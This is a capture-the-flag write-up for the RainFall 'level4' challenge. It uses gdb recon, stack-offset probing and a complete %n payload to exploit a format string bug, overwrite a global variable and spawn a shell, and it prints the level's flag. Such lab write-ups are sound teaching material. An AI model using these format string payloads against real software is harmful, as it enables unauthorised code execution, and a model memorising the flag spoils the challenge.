# Level4 — Format String Attack / Large Arbitrary Write

## Vulnerability

Same class of vulnerability as level3: `printf()` is called on user-controlled input without a format string. The difference here is that the target value to write is **16930116** (`0x1025544`) instead of 64, making a naive byte-count approach impractical. The trick is to use `%Nx` (width padding) to make `printf` "print" a huge number of characters without actually outputting them all visibly, then use `%n` to write that count into the target address.

The goal is to overwrite the global variable at `0x8049810` with `0x1025544` to pass a comparison that triggers `system("/bin/sh")`.

---

## Recon

**`main` calls `n()`, which calls `p()` for the format string vuln:**

```gdb
(gdb) disass main
   0x080484ad <+6>:   call   0x8048457 <n>

(gdb) disass p
   0x08048450 <+12>:  call   0x8048340 <printf@plt>   ; ← vulnerable, no format string
```

**`n()` contains the target condition:**

```gdb
(gdb) disass n
   0x0804847a <+35>:  call   0x8048350 <fgets@plt>    ; safe read
   0x08048488 <+49>:  call   0x8048444 <p>            ; calls printf(buf) inside
   0x0804848d <+54>:  mov    0x8049810,%eax           ; load global var m
   0x08048492 <+59>:  cmp    $0x1025544,%eax          ; compare to 16930116
   0x08048497 <+64>:  jne    0x80484a5 <n+78>         ; skip shell if not equal
   ...
   0x080484a0 <+73>:  call   0x8048360 <system@plt>   ; system("/bin/sh")
```

**Target value in decimal:**

```gdb
(gdb) print 0x1025544
$1 = 16930116
```

**Finding our stack position** with a canary (`AAAA` = `0x41414141`):

```bash
python -c "print('AAAA' + '_%x' * 20)" > /tmp/exploit4
cat /tmp/exploit4 | ./level4
# ...41414141... appears at position 12
```

**Direct parameter access confirms it:**

```bash
python -c "print('AAAA' + '_%12\$x')" > /tmp/exploit4
cat /tmp/exploit4 | ./level4
# AAAA_41414141  ← our input is at position 12 ✓
```

---

## Exploit

We need `printf` to have printed exactly **16930116** bytes when `%12$n` fires:
- 4 bytes → the address itself (`\x10\x98\x04\x08`)
- 1 byte → `_`
- 16930110 bytes → via `%.16930110x` width padding
- 1 byte → `_`
- Total: **4 + 1 + 16930110 + 1 = 16930116** → `m = 0x1025544` ✓

```bash
python -c "print('\x10\x98\x04\x08' + '_%.16930110x_%12\$n')" > /tmp/exploit
cat /tmp/exploit | ./level4
```

---

## Flow

```
n() calls fgets()  →  user controls input buffer
        │
        ▼
n() calls p()  →  p() calls printf(buffer)  ←  VULNERABLE
        │
        ├── %x * 20 leaks stack  →  41414141 found at position 12
        │
        └── %12$n writes byte-count into *arg[12]
                │
                ▼
         arg[12] = 0x8049810  (address of global var m)
         bytes printed = 4 + 1 + 16930110 + 1 = 16930116 = 0x1025544
                │
                ▼
        cmp m, 0x1025544  →  equal  →  JNE not taken
                │
                ▼
        system("/bin/sh")  ←  shell spawned as level5
```

**Shell session after exploitation:**

```bash
level4@RainFall:~$ cat /tmp/exploit | ./level4
[... massive padding output ...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9eca1
```

---

## Commands Summary

```bash
# Find the target value in decimal
gdb ./level4
(gdb) print 0x1025544                               # → 16930116

# Find our stack position (look for 41414141)
python -c "print('AAAA' + '_%x' * 20)" > /tmp/exploit4
cat /tmp/exploit4 | ./level4                        # → position 12

# Confirm with direct access
python -c "print('AAAA' + '_%12\$x')" > /tmp/exploit4
cat /tmp/exploit4 | ./level4                        # → AAAA_41414141

# Final payload: addr(4) + _(1) + padding(16930110) + _(1) = 16930116 = 0x1025544
python -c "print('\x10\x98\x04\x08' + '_%.16930110x_%12\$n')" > /tmp/exploit

# Execute the exploit
cat /tmp/exploit | ./level4
